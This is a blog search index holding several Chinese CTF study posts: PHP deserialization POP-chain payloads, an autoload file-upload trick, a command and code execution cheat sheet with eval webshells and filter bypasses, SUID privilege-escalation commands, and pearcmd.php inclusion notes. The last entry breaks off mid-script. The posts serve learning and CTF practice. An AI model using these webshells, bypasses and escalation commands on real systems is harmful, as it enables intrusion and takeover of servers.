<?xml version="1.0" encoding="utf-8"?>
<search> 
  
  
    
    <entry>
      <title>phar反序列化</title>
      <link href="/2022/09/20/phar%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/"/>
      <url>/2022/09/20/phar%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/</url>
      
        <content type="html"><![CDATA[]]></content>
      
      
      <categories>
          
          <category> Web安全 </category>
          
          <category> 文件上传 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Web安全 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>2022羊城杯两道反序列化题</title>
      <link href="/2022/09/19/2022%E7%BE%8A%E5%9F%8E%E6%9D%AF%E4%B8%A4%E9%81%93%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E9%A2%98/"/>
      <url>/2022/09/19/2022%E7%BE%8A%E5%9F%8E%E6%9D%AF%E4%B8%A4%E9%81%93%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E9%A2%98/</url>
      
        <content type="html"><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><blockquote><p>在此之前从未做出来过有关反序列化的题目，今天通过复现这两道题来浅学以下反序列化题目。之前始终无法理解如何使用，其根本原因发现是因为没有彻底理解魔术方法的使用，导致别人的pop链始终看不懂</p></blockquote><h2 id="step-by-step-v3"><a href="#step-by-step-v3" class="headerlink" title="step_by_step-v3"></a>step_by_step-v3</h2><h3 id="前言-1"><a href="#前言-1" class="headerlink" title="前言"></a>前言</h3><blockquote><p>这道题在phpinfo里面存在flag的值，可能是一个非预期解。正常的情况应该是绕过include_once去读取到hint.php的数值。由于我是复现，并没有hint.php的内容，这里重点使用的是如果读取phpinfo，已经如何绕过include_once</p></blockquote><h3 id="源代码"><a href="#源代码" class="headerlink" title="源代码"></a>源代码</h3><pre><code class="php">&lt;?phperror_reporting(0);class yang&#123;    public $y1;    public function __construct()    &#123;        $this-&gt;y1-&gt;magic();    &#125;    // 调用tostring执行phpinfo    public function __tostring()    &#123;        ($this-&gt;y1)();    &#125;    public function hint()    &#123;        include_once(&#39;hint.php&#39;);        if(isset($_GET[&#39;file&#39;]))        &#123;            $file = $_GET[&#39;file&#39;];            if(preg_match(&quot;/$hey_mean_then/is&quot;, $file))            &#123;                die(&quot;nonono&quot;);            &#125;            include_once($file);        &#125;    &#125;&#125;class cheng&#123;    public $c1;    public function __wakeup()    &#123;        $this-&gt;c1-&gt;flag = &#39;flag&#39;;    &#125;    public function __invoke()    &#123;        $this-&gt;c1-&gt;hint();    &#125;&#125;class bei&#123;    public $b1;    public $b2;    public function __set($k1,$k2)    &#123;        print $this-&gt;b1;    &#125;    public function __call($n1,$n2)    &#123;        echo $this-&gt;b1;    &#125;&#125;if (isset($_POST[&#39;ans&#39;])) &#123;    unserialize($_POST[&#39;ans&#39;]);&#125; else &#123;    highlight_file(__FILE__);&#125;?&gt;</code></pre><h3 id="exp1：利用-tostring"><a href="#exp1：利用-tostring" class="headerlink" title="exp1：利用__tostring"></a>exp1：利用__tostring</h3><p>（1）payload</p><pre><code class="php">&lt;?phpclass yang&#123;    public $y1;&#125;class cheng&#123;    public $c1;&#125;class bei&#123;    public $b1;    public $b2;&#125;$yang=new yang();$cheng=new cheng();$bei=new bei();$yang-&gt;y1=&quot;phpinfo&quot;;$bei-&gt;b1=$yang;$cheng-&gt;c1=$bei;echo serialize($cheng);?&gt;</code></pre><p>（2）分析</p><blockquote><ul><li>首先在yang类当中的存在__tostring魔术方法，只要$yang-&gt;y1 &#x3D; “phpinfo()”，然后echo $yang即可。接下来需要查看哪里存在输出函数</li><li>存在输出函数的有两个地方，一个是bei类中的set魔术方法和call魔术方法。且输出的都是 $bei-&gt;b1 。只要赋值 $bei-&gt;b1&#x3D;$yang， 就能够print phpinfo(); 接下来要做的就是如何调用set或者是call魔术方法</li><li>首先看set魔术方法调用的前提条件是要么b1或者b2为不可见属性，要么bei对象调用了bei类中未定义的属性，显然只能是第二种方式了。查看整个程序，可以发现在cheng类当中，存在this-&gt;c1-&gt;flag和hint，只要$cheng-&gt;c1&#x3D;$bei，那么只要存在bei-&gt;flag就会调用set魔术方法。而此时的wakeup恰好执行反序列化时就会调用，直接赋值即可</li></ul></blockquote><p>（3）逆向思维得到payload</p><pre><code class="php">$cheng = new cheng();$cheng-&gt;c1=new bei();$cheng-&gt;c1-&gt;b1 = new yang();$cheng-&gt;c1-&gt;b1-&gt;y1 = &quot;phpinfo&quot;;echo serialize($cheng);</code></pre><p>首先令c1等于bei对象，从而使得调用</p><p>（4）反思</p><blockquote><p>通过上面的解题思路，还有几种未尝试的方法，即使用call魔术方法和invoke函数方法，从而得到了以下的payload</p></blockquote><h3 id="exp2："><a href="#exp2：" class="headerlink" title="exp2："></a>exp2：</h3><p>（1）payload</p><pre><code class="php">&lt;?phperror_reporting(0);class yang&#123;    public $y1;&#125;class cheng&#123;    public $c1;&#125;class bei&#123;    public $b1;    public $b2;&#125;// 调用wakeup函数，使得$bei-&gt;flag，从而调用set方法$cheng = new cheng();$cheng-&gt;c1 = new bei();// 打印出this-&gt;b1的值，这里的被设置成了类yang的对象，从而调用了tostring方法$cheng-&gt;c1-&gt;b1 = new yang();// 设置y1的值为类cheng的对象，此时的结果是$cheng()，此时就会调用invoke方法$cheng-&gt;c1-&gt;b1-&gt;y1 = new cheng();// 最后设c1的数值为yang类实例化后的对象，就会调用yang当中的hint方法$cheng-&gt;c1-&gt;b1-&gt;y1-&gt;c1 = new yang();echo serialize($a);?&gt;</code></pre><h2 id="safepop"><a href="#safepop" class="headerlink" title="safepop"></a>safepop</h2><p>思路</p><blockquote><p>目的：只要调用Test类中的getflag即可即可，这个在Func类中的call_user_func函数就能做到 </p><p>只要能调用Func类中的call魔术方法，即调用Func类中不存在的方法即可。进而需要调用get魔术方法，即a对象调用一个未定义的变量即可；这个在B类中的__destruct魔术方法中就存在，目的反推出了条件，符合</p></blockquote><h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><blockquote><p>首先反序列化的题目可以分为正向分析和逆向分析，这两种思路其实是按照条件来的，看你先看到的是可以利用的条件还是你需要到达的条件。遇到难点的正向逆向可以同时分析</p><p>然后就是发现了解了魔术方法的如何使用之后，就会发现所谓的POP链，就是不断的构造好条件使得能调用魔术方法，然后调用里面的内容</p><p>重点是找目的和条件，根据条件如何实现某项功能罢了，现在目前所学到的就这些</p></blockquote>]]></content>
      
      
      <categories>
          
          <category> Web安全 </category>
          
          <category> 文件上传 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Web安全 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>spl_autoload_register文件上传</title>
      <link href="/2022/09/19/spl-autoload-register%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/"/>
      <url>/2022/09/19/spl-autoload-register%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/</url>
      
        <content type="html"><![CDATA[<h2 id="前提"><a href="#前提" class="headerlink" title="前提"></a>前提</h2><p>2022年强网杯的rcefile题目，题目打开网页是一个文件上传题目。但是题目给出了源码，肯定结合源码进行操作，但是在阅读源码时，忽略了一个最重要的代码spl_autoload_register函数。</p><h2 id="一、分析题目"><a href="#一、分析题目" class="headerlink" title="一、分析题目"></a>一、分析题目</h2><p>扫目录发现备份文件<a href="http://www.zip，备份文件存在四个文件：index.php、upload.php、config.ini.php、showfile.php">www.zip，备份文件存在四个文件：index.php、upload.php、config.ini.php、showfile.php</a></p><blockquote><ul><li>上传文件存在黑名单：”php”, “php5”, “php3”, “html”, “swf”, “htm”,”phtml”</li><li>上传的文件名经过md5的时间加密后进行重命名， 然后再移动上传文件的位置至根目录下</li><li>程序会将文件名保存到到userfile数组里面，然后讲userfile数组经过序列化以后设置成cookie，</li><li>config.ini.php文件中存在spl_autoload_register()函数，而且这里会将收到的cookie又反序列化保存到userfile当中</li><li>showfile.php会for然后for循环遍历数组以此展示上传的文件名（类型是字符串）</li></ul></blockquote><h2 id="二、解题思路"><a href="#二、解题思路" class="headerlink" title="二、解题思路"></a>二、解题思路</h2><blockquote><ol><li><p>首先程序没有限制大小写，可以尝试使用大小写进行绕过，失败</p></li><li><p>由于题目对文件进行了重命名，那么就无法使用配置文件，也无法使用解析漏洞进行绕过</p></li><li><p>又由于题目是先重命名以后再移动文件的，那么就无法使用条件竞争来进行绕过了</p></li><li><p>尝试使用修改cookie老修改文件名，失败。因为showfile展示的文件名是字符串形式的，并不能执行</p></li><li><p>又尝试使用文件读取来做，发现题目是直接以路径的形式直接展示的</p><p>&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;》上面的结论是：无法使用常规的文件上传来解析php代码</p></li><li><p>最终的实现方式是利用spl_autoload_register函数：在不指定处理用的函数，就会自动包含“类名.php”或者是“类名.inc”的文件，并加载其中的“类名”类</p></li></ol></blockquote><h2 id="三、payload"><a href="#三、payload" class="headerlink" title="三、payload"></a>三、payload</h2><h3 id="1、知识点"><a href="#1、知识点" class="headerlink" title="1、知识点"></a>1、知识点</h3><p>（1）spl_autoload_register()函数</p><blockquote><p>spl_autoload_register()：欲注册的自动装载函数。如果没有提供任何参数，则自动注册 autoload 的默认实现函数spl_autoload()</p><ul><li>spl_autoload()：本函数提供了_autoload()的一个默认实现，如果不使用任何参数调用 spl_autoload_register() 函数，则以后在进行 __autoload() 调用时会自动使用此函数。</li><li>__autoload()函数：尝试加载未定义的类，但是PHP7.2.0起被废弃，PHP8以后被移除</li></ul></blockquote><pre><code class="php">spl_autoload(string $class_name, string $file_extensions = ?): void</code></pre><ul><li>file_extentsions：在默认情况下，本函数先将类名转换成小写，再在小写的类名后面加上.inc或者是php的拓展名作为文件名，然后在所以的包含路径（include paths）中检查是否存在文件</li></ul><h3 id="2、利用过程"><a href="#2、利用过程" class="headerlink" title="2、利用过程"></a>2、利用过程</h3><p>（1）上传webshell，文件名是“文件名.inc”。此时程序会生成md5生成一个新的文件名xxx.inc。</p><p>（2）将重命名后的名字xxx进行发序列化以后，以此来作为修改cookie值</p>]]></content>
      
      
      <categories>
          
          <category> Web安全 </category>
          
          <category> 文件上传 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Web安全 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>基础系列03-代码执行</title>
      <link href="/2022/09/19/%E5%9F%BA%E7%A1%80%E7%B3%BB%E5%88%9703-%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C-md/"/>
      <url>/2022/09/19/%E5%9F%BA%E7%A1%80%E7%B3%BB%E5%88%9703-%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C-md/</url>
      
        <content type="html"><![CDATA[<h1 id="一、什么是代码执行与命令执行"><a href="#一、什么是代码执行与命令执行" class="headerlink" title="一、什么是代码执行与命令执行"></a>一、什么是代码执行与命令执行</h1><p>1、代码执行</p><blockquote><p>代码执行就是特殊的函数能够将一些字符串当作代码一样来执行，像”phpinfo();”，它本身是字符串，但是加上特殊函数(eval等)之后就会打印出信息。php代码中本身就存在一些特殊的函数像system函数，它的作用就是执行系统命令。这样的话eval(“system(“ls”)”)；这样的话就会执行系统命令，所以说代码执行的定义相比命令执行更加大一些</p></blockquote><p>2、命令执行：</p><blockquote><p>就是Windows、Linux下面的命令，通过system等就可以执行php代码中执行</p></blockquote><h1 id="二、常见函数总结"><a href="#二、常见函数总结" class="headerlink" title="二、常见函数总结"></a>二、常见函数总结</h1><h2 id="1、常见的命令执行函数及运算符"><a href="#1、常见的命令执行函数及运算符" class="headerlink" title="1、常见的命令执行函数及运算符"></a>1、常见的命令执行函数及运算符</h2><p>（1）system函数</p><pre><code class="php">system(string $command, int &amp;$return_var = ?): string</code></pre><ul><li>command表示执行的命令</li><li>return_var：存在则表示执行命令后的返回状态将会设置到此变量中</li><li>它会输出返回结果</li></ul><p>（2）exec函数与shell_exec函数</p><ul><li>作用执行系统命令</li><li>exec：输出结果不会返回，需要使用echo才会输出结果</li><li>shell_exec：通过shell环境执行命令，并且会输出完整的结果</li></ul><p>（3）反引号</p><p>它的作用相当于system，但是它不会返回结果，需要用echo输出出来</p><p>（4）除此之外还有很多函数，之后遇到再补充</p><ul><li>pssthru函数</li><li>popen函数</li><li>proc_open函数</li></ul><h2 id="2、常见的代码执行函数"><a href="#2、常见的代码执行函数" class="headerlink" title="2、常见的代码执行函数"></a>2、常见的代码执行函数</h2><p>（1）eval函数</p><pre><code class="php">eval(string $code)</code></pre><ul><li>code表示要执行的php代码</li></ul><p>常见的使用eval函数的有</p><pre><code class="php">&lt;?ph eval($_POST[1]);?&gt;&lt;?ph eval(system(&quot;ls&quot;));?&gt;</code></pre><p>（2）assert函数</p><p><a href="https://www.php.cn/php-ask-429607.html">https://www.php.cn/php-ask-429607.html</a></p><p>（3）除此之外还没很多函数，遇到以后再学</p><ul><li>call_user_func函数</li><li>call_user_func_array函数</li><li>create_function函数</li><li>array_map函数</li><li>preg_replace函数</li></ul><h1 id="三、命令连接符"><a href="#三、命令连接符" class="headerlink" title="三、命令连接符"></a>三、命令连接符</h1><h2 id="1、windows下常见的命令连接符"><a href="#1、windows下常见的命令连接符" class="headerlink" title="1、windows下常见的命令连接符"></a>1、windows下常见的命令连接符</h2><p>（1）&amp;命令连接符</p><ul><li>两条命令都执行，不管前面的语句是否为真</li></ul><p>（2）&amp;&amp;命令连接符</p><ul><li>&amp;&amp;前面的语句为假，直接报错，&amp;&amp;后面的也不执行</li><li>&amp;&amp;前面的语句为真，&amp;&amp;前后的语句都执行</li></ul><p>（3）|命令连接符</p><ul><li>|前面的语句为假，直接报错，|后面的也不执行</li><li>|前面的语句为真，执行|后面的语句</li></ul><p>（4）||命令连接符</p><ul><li>类似if-else语句，前面为真执行前面，否则执行后面</li></ul><h2 id="2、linux下常见的命令连接符"><a href="#2、linux下常见的命令连接符" class="headerlink" title="2、linux下常见的命令连接符"></a>2、linux下常见的命令连接符</h2><p>（1）&amp;命令连接符</p><ul><li>两条命令都执行，不管前面的语句是否为真</li></ul><p>（2）&amp;&amp;命令连接符</p><ul><li>&amp;&amp;前面的语句为假，直接报错，&amp;&amp;后面的也不执行</li><li>&amp;&amp;前面的语句为真，&amp;&amp;前后的语句都执行</li></ul><p>（3）|命令连接符</p><ul><li>|前面的命令的输出作为后面命令的输入，前后命令都执行但是只显示后面的命令结果</li></ul><p>（4）||命令连接符</p><ul><li>类似if-else语句，前面为真执行前面，否则执行后面</li></ul><p>（5）；命令连接符</p><ul><li>多个命令顺序执行，前后两条命令都会执行</li></ul><h2 id="3、命令连接符总结"><a href="#3、命令连接符总结" class="headerlink" title="3、命令连接符总结"></a>3、命令连接符总结</h2><p>（1）区别</p><blockquote><p>Windows与Linux的命令连接符除了|之外差不多，但是两者最终显示的都是|后面的结果。而且linux相比windows多了一条分号</p></blockquote><p>（2）作用</p><blockquote><p>命令连接符的主要作用就是分割命令，分别执行。 目前这种我所看到的主要就是程序会把输出的结果重定向到null处，所以需要使用连接符进行分割</p></blockquote><p>（3）常见命令连接符的使用</p><blockquote><p>Linux下面的分号、||、&amp;。因为这集中前面的结果都会展示</p></blockquote><h1 id="四、常见过滤以及绕过方式"><a href="#四、常见过滤以及绕过方式" class="headerlink" title="四、常见过滤以及绕过方式"></a>四、常见过滤以及绕过方式</h1><h2 id="1、绕过过滤空格"><a href="#1、绕过过滤空格" class="headerlink" title="1、绕过过滤空格"></a>1、绕过过滤空格</h2><p>（1）%09绕过</p><p>（2）{}绕过</p><p><del>（3）${IFS}绕过</del></p><p>（4）&lt;绕过：cat&lt;flag.php</p><h2 id="2、绕过过滤关键字方法"><a href="#2、绕过过滤关键字方法" class="headerlink" title="2、绕过过滤关键字方法"></a>2、绕过过滤关键字方法</h2><p>（1）变量拼接</p><pre><code class="shell">a=c;b=at;$a$b flag.php</code></pre><p>（2）空变量绕过</p><pre><code class="shell">ca&#123;x&#125;t flag.php</code></pre><p>（3）\绕过</p><pre><code class="shell">c\a\t flag.php</code></pre><p>（4）通配符绕过</p><pre><code class="shell">cat flag.*</code></pre><p>（5）base64绕过</p><pre><code class="shell">echo &quot;Y2F0IGZsYWcucGhw&quot;|base64 -d</code></pre><p>cat flag.php</p><h2 id="3、常见关键字替换"><a href="#3、常见关键字替换" class="headerlink" title="3、常见关键字替换"></a>3、常见关键字替换</h2><p>（1）cat命令</p><ul><li><p>tac flag</p></li><li><p>c\a\t flag</p></li><li><p>echo Y2F0IGZsYWcucGhwCg&#x3D;&#x3D;|base64 -d</p></li><li><p>nl flag.php</p></li><li><p>more</p></li><li><p>less</p></li><li><p>nl：用来计算文件中的行号，可以理解为cat -n；但是实际上不一样</p></li><li><p>uniq：检查以及删除文本文件中重复出现的行列，然后打印出结果</p></li><li><p>sort：根据每行的首字母的顺序进行排序，打印出结果</p></li><li><p>tail</p></li></ul><p>（2）system函数</p><ul><li>exec</li><li>反引号</li><li>shell_exec</li></ul><h2 id="4、过滤括号（文件包含绕过）"><a href="#4、过滤括号（文件包含绕过）" class="headerlink" title="4、过滤括号（文件包含绕过）"></a>4、过滤括号（文件包含绕过）</h2><p>（1）常见的题型</p><pre><code class="php">&lt;?phperror_reporting(0);if(isset($_GET[&#39;c&#39;]))&#123;    $c = $_GET[&#39;c&#39;];    if(!preg_match(&quot;/flag|system|php|cat|sort|shell|\.| |\&#39;|\`|echo|\;|\(|\:|\&quot;|\&lt;|\=/i&quot;, $c))&#123;        eval($c);    &#125;    &#125;else&#123;    highlight_file(__FILE__);&#125;</code></pre><p>（2）一般是上面的这类题，使用的代码执行（eval函数等），过滤掉了括号，而eval函数一般使用等等方式有</p><p>① 写一句话木马上去</p><pre><code class="http">?c=file_put_contents(&quot;hack.php&quot;, &quot;&lt;?ph eval(\$_POST[1]);?&gt;&quot;);</code></pre><pre><code class="http">?C=echo &quot;&lt;?ph eval(\$_POST[1]);?&gt;&quot; &gt; &quot;hack.php&quot; ;</code></pre><p>② 利用system函数执行系统指令以实现绕过 </p><pre><code class="http">?c=system(&quot;cat flag.php&quot;);</code></pre><p>③ 使用参数逃逸的方式进行</p><pre><code class="http">?c=eval($_GET[1]);&amp;1=system(&quot;cat flag.php&quot;)</code></pre><blockquote><p>上面的所有情况基本上都是涉及到括号的，这是因为基本上都调用了函数，这主要的原因是php中直接代码getshell的只有一句话木马（我知道的），phpinfo只能是一种测试，本身用处不大。唯一那种木马的绕过方式一旦尖括号被过滤就没有任何办法，所以采取发方式就是文件包含的方式 + 参数逃逸，这个主要的原因是这有这两个函数能在没有括号的时候能获取到文件里面的内容</p></blockquote><pre><code class="http">?c=include $_GET[1];&amp;1=php://filter/convert.base64-encode/resource=flag.php</code></pre><h2 id="5、关键字及其子关键字过滤"><a href="#5、关键字及其子关键字过滤" class="headerlink" title="5、关键字及其子关键字过滤"></a>5、关键字及其子关键字过滤</h2><blockquote><p>这种题型适合与关键的命令被过滤掉，此时我们就可以根据系统存放命令的地方结合通配符进行使用</p></blockquote><p>（1）获取基本命令关键字</p><p>在Linux根目录下存在一个bin目录，它的作用就是用来存放系统的所有用户使用的指令。当然肯定会包括cat这些命令</p><p>此时再结合通配符，实现命令绕过</p><ul><li>&#x2F;bin&#x2F;ca?</li></ul><p>当然这种方式肯定是有局限性的，这种方式的主要问题在于你使用的通配符后，对应产生的命令有多条，而他会优先考虑前面的命令，经过在我Ubuntu下面的测试发现下面的指令的是唯一的</p><p><img src="/img/image-20220723102008656.png" alt="image-20220723102008656"></p><p>（2）过滤掉字母</p><p>Linux下面还会存在一个base64的指令，根据通配符匹配后执行的优先级，它会优先执行base64。当然并不是每种环境下面都会存在这个命令，这只是一种方式</p><p><img src="/img/image-20220723101754311.png" alt="image-20220723101754311"></p><p>payload：直接读取flag.php，这种文件名占八位的所有文件的内容，并以十六进制的形式展示出来</p><pre><code class="http">?c=/???/????64 ????????</code></pre><h2 id="6、过滤数字以及字母"><a href="#6、过滤数字以及字母" class="headerlink" title="6、过滤数字以及字母"></a>6、过滤数字以及字母</h2><p>（1）异或</p><ul><li><p>‘a’^’&lt;’    &#x3D;&#x3D;》 [</p></li><li><p>‘]’^’&lt;’     &#x3D;&#x3D;》 a</p></li><li><p>取反</p></li><li><p>自增</p></li></ul><h2 id="7、如何实现上传一句话木马"><a href="#7、如何实现上传一句话木马" class="headerlink" title="7、如何实现上传一句话木马"></a>7、如何实现上传一句话木马</h2><p>（1）使用echo语句直接写入</p><pre><code class="http">?C=echo &quot;&lt;?ph eval(\$_POST[1]);?&gt;&quot; &gt; &quot;hack.php&quot; ;</code></pre><p>（2）使用file_put_contents函数写入</p><pre><code class="http">?c=file_put_contents(&quot;hack.php&quot;, &quot;&lt;?ph eval(\$_POST[1]);?&gt;&quot;);</code></pre><h2 id="7、disable-function"><a href="#7、disable-function" class="headerlink" title="7、disable_function"></a>7、disable_function</h2><h2 id="8、过滤-lt"><a href="#8、过滤-lt" class="headerlink" title="8、过滤&lt;"></a>8、过滤&lt;</h2><ul><li><p>过滤掉以后，无法实现一句话木马</p></li><li><p>无法实现</p></li></ul><h2 id="9、常见的小技巧"><a href="#9、常见的小技巧" class="headerlink" title="9、常见的小技巧"></a>9、常见的小技巧</h2><ul><li>短标签替换</li><li>；  &#x3D;&#x3D;》 ?&gt;</li></ul>]]></content>
      
      
      <categories>
          
          <category> Web安全 </category>
          
          <category> 代码执行 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Web安全 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>SUID提权</title>
      <link href="/2022/09/19/SUID%E6%8F%90%E6%9D%83-md/"/>
      <url>/2022/09/19/SUID%E6%8F%90%E6%9D%83-md/</url>
      
        <content type="html"><![CDATA[<h2 id="前提"><a href="#前提" class="headerlink" title="前提"></a>前提</h2><p>一般rce之后访问服务器的权限都是普通用户，要想获取管理员的权限就需要提权，而suid提权就是其中一种比较常见的提权方式，见过几次，这里浅研究一下</p><h2 id="1、什么是SUID"><a href="#1、什么是SUID" class="headerlink" title="1、什么是SUID"></a>1、什么是SUID</h2><p>首先我们都知道Linux中 <code>/etc/shadow</code>中存放的是用户的账号密码，但是shadow这个目录所属为root，所以说其余用户没有修改的权限的。但是身为普通用户却能修改自己的账号密码，进而修改shadow当中的内容。 这个原因就是SUID<img src="https://myblog-1305715400.cos.ap-nanjing.myqcloud.com/img/image-20220910164855571.png" alt="image-20220910164855571"></p><p>SUID（set UID）是一种对二进制程序进行设置的特殊权限,可以让二进制程序的执行者临时拥有属主的权限。就是说当你执行passwd命令时，它就相当拥有root权限，此时就能修改shadow文件的里面。而二进制程序是否存在suid权限，看最前面是否存在-s参数</p><p><img src="https://myblog-1305715400.cos.ap-nanjing.myqcloud.com/img/image-20220910142352472.png" alt="image-20220910142352472"></p><p>而添加添加suid权限的方法为</p><pre><code>chmod u+s 命令</code></pre><h2 id="2、搜索具备SUID的程序"><a href="#2、搜索具备SUID的程序" class="headerlink" title="2、搜索具备SUID的程序"></a>2、搜索具备SUID的程序</h2><p>以下语句能搜索哪些具备SUID的程序</p><pre><code class="bash">find / -perm -u=s -type f 2&gt;/dev/null</code></pre><ul><li>-perm：按照文件权限的类型进行查找，-u&#x3D;s，查找带有s权限的文件</li><li>type f：按照文件来查找</li><li>2&gt;&#x2F;dev&#x2F;null：把错误的输出到“黑洞”，就是不会显示到屏幕上</li></ul><pre><code class="bash">find / -user root -perm -4000 -exec ls -ldb &#123;&#125; ;</code></pre><ul><li>-perm -4000，查看文件为4000（表示拥有suid权限）权限的文件</li><li>-exec ls： 表示将查到的文件列出来，列出的方式是</li><li>-ldb ：l表示以列表的形式，-d表示仅列出目录本身，而不列出目录内的文件数据</li><li>{}：花括号代表前面find查找出来的文件名</li></ul><h2 id="3、利用方式"><a href="#3、利用方式" class="headerlink" title="3、利用方式"></a>3、利用方式</h2><p>常见的提权文件有：Nmap、Vim、find、Bash、More、less、Nano、cp、</p><h3 id="（1）find"><a href="#（1）find" class="headerlink" title="（1）find"></a>（1）find</h3><p>因为find命令中有参数-exec，它能重新执行参数后面的命令，这样就可以以root的权限执行该命令</p><pre><code class="bash">find /flag -exec whoami \;</code></pre><p><img src="https://myblog-1305715400.cos.ap-nanjing.myqcloud.com/img/image-20220911213529314.png" alt="image-20220911213529314"></p><pre><code>find /flag -exec /bin/bash -p \;</code></pre><p><img src="https://myblog-1305715400.cos.ap-nanjing.myqcloud.com/img/image-20220911213700243.png" alt="image-20220911213700243"></p><h3 id="（2）Nmap"><a href="#（2）Nmap" class="headerlink" title="（2）Nmap"></a>（2）Nmap</h3><p>nmap在早期的版本中，带有交互模式，允许用户执行shell命令</p><p>使用如下命令进入nmap交互模式:</p><pre><code class="bash">nmap --interactive</code></pre><p>在nmap交互模式中 通过如下命令提权</p><pre><code class="bash">nmap&gt; !sh</code></pre><h3 id="（3）Vim"><a href="#（3）Vim" class="headerlink" title="（3）Vim"></a>（3）Vim</h3><p>vim如果具有suid权限，那么就可以之前读取文件内容了</p><h3 id="（4）Bash"><a href="#（4）Bash" class="headerlink" title="（4）Bash"></a>（4）Bash</h3><p>bash -p直接进入root权限</p><h3 id="（5）more与less"><a href="#（5）more与less" class="headerlink" title="（5）more与less"></a>（5）more与less</h3><p>more与less类似，利用命令进入shell</p><pre><code>less /etc/passwd</code></pre><p>#在less中输入:</p><pre><code>!/bin/sh</code></pre><p>z注意：使用more和less时一定要读取一个比较大的文件</p><h2 id="4、参考链接"><a href="#4、参考链接" class="headerlink" title="4、参考链接"></a>4、参考链接</h2><p>1、<a href="http://www.hackdig.com/05/hack-351745.htm">http://www.hackdig.com/05/hack-351745.htm</a></p><p>2、<a href="https://blog.csdn.net/weixin_39430198/article/details/123504153">https://blog.csdn.net/weixin_39430198/article/details/123504153</a></p>]]></content>
      
      
      <categories>
          
          <category> Web安全 </category>
          
          <category> SUID提权 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Web安全 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>pearcmd.php文件包含</title>
      <link href="/2022/09/19/pearcmd-php%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB-md/"/>
      <url>/2022/09/19/pearcmd-php%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB-md/</url>
      
        <content type="html"><![CDATA[<h2 id="一、前言"><a href="#一、前言" class="headerlink" title="一、前言"></a>一、前言</h2><p>最近在做羊城杯的rce_me发现常见的文件包含无法绕过（无法使用data伪协议等写入、无权限读取文件、无日志文件），通过题解发现使用的是pearcmd.php文件包含，浅学一下</p><h2 id="二、环境"><a href="#二、环境" class="headerlink" title="二、环境"></a>二、环境</h2><blockquote><ul><li>开启了register_argc_argv</li><li>开启了pear（这样才有pearcmd.php文件）</li><li>存在文件包含，而且可以包含php后缀</li></ul></blockquote><h2 id="三、基本知识点"><a href="#三、基本知识点" class="headerlink" title="三、基本知识点"></a>三、基本知识点</h2><h3 id="1、register-argc-argv配置"><a href="#1、register-argc-argv配置" class="headerlink" title="1、register_argc_argv配置"></a>1、register_argc_argv配置</h3><p>（1）性质</p><blockquote><ul><li>如果存在php.ini的话，默认是off；如果没有php.ini则默认是on开启的</li><li>PHP官方提供的镜像里面默认没有php.ini，所以也是默认开启了register_argc_agrv</li><li>当开启register_argc_argv时，$_SERVER[‘argv’]就会生效。即URL中？号后面的内容会全部传入至$_SERVER[‘argv’]这个变量内，无论后面的内容是否存在等号</li></ul></blockquote><p>（2）测试</p><p>在php.ini里面将register_argc_argv设置为开启状态。 然后编写代码，查看$_SERVER[‘argv’]的数值</p><p><img src="/img/image-20220908220322891.png" alt="image-20220908220322891"></p><p>可以发现以下信息</p><blockquote><ul><li>$_SERVER[‘argv’]数组按照加号作为分隔符，依次将参数的值传递至数组当中。这里存在一点问题，看别人的博客，他们的array[0]都是脚本名，可能是版本原因或者是配置的原因</li><li>&#x3D;不能作为赋值，而是作为一个字符</li><li>&amp;不能作为分隔符</li></ul></blockquote><h3 id="2、pearcmd-php文件"><a href="#2、pearcmd-php文件" class="headerlink" title="2、pearcmd.php文件"></a>2、pearcmd.php文件</h3><blockquote><p>pear是php当中的一个命令行扩展管理工具，它默认是是在&#x2F;usr&#x2F;local&#x2F;lib&#x2F;php&#x2F;pearcmd.php，而我的是存放在&#x2F;usr&#x2F;share&#x2F;php&#x2F;pearcmd.php。在命令行下可以使用pear或者 php &#x2F;usr&#x2F;share&#x2F;php&#x2F;pearcmd.php 运行该工具。该文件虽然不存在与Web目录下，但是如果存在文件包含漏洞，那么我们就可以运行这个命令工具</p></blockquote><p>（1）Ubuntu安装ppear，其中的php7.0根据自己的php版本进行修改，如果是7.4.3就改为php7.4,其余不变</p><pre><code class="shell">sudo apt-get install autoconf libz-dev php7.0-dev php-pear</code></pre><ul><li>在<code>/usr/bin/pear</code>下查看pear命令</li></ul><pre><code class="bash">#!/bin/sh# first find which PHP binary to useif test &quot;x$PHP_PEAR_PHP_BIN&quot; != &quot;x&quot;; then  PHP=&quot;$PHP_PEAR_PHP_BIN&quot;else  if test &quot;/usr/bin/php&quot; = &#39;@&#39;php_bin&#39;@&#39;; then    PHP=php  else    PHP=&quot;/usr/bin/php&quot;  fifi# then look for the right pear include dirif test &quot;x$PHP_PEAR_INSTALL_DIR&quot; != &quot;x&quot;; then  INCDIR=$PHP_PEAR_INSTALL_DIR  INCARG=&quot;-d include_path=$PHP_PEAR_INSTALL_DIR&quot;else  if test &quot;/usr/share/php&quot; = &#39;@&#39;php_dir&#39;@&#39;; then    INCDIR=`dirname $0`    INCARG=&quot;&quot;  else    INCDIR=&quot;/usr/share/php&quot;    INCARG=&quot;-d include_path=/usr/share/php&quot;  fifiexec $PHP -C -q $INCARG -d date.timezone=UTC -d output_buffering=1 -d 